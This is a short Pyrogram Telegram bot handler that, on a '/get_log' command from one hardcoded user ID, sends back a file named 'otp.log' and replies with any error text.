from pyrogram import Client, filters

from pyrogram.types import Message


@Client.on_message(filters.command("get_log"))
async def get_log(bot, m: Message):
    if m.from_user.id != 2142595466:
        return
    try:
        await m.reply_document("otp.log", caption="Here is the log file")
    except Exception as e:
        await m.reply_text(str(e))

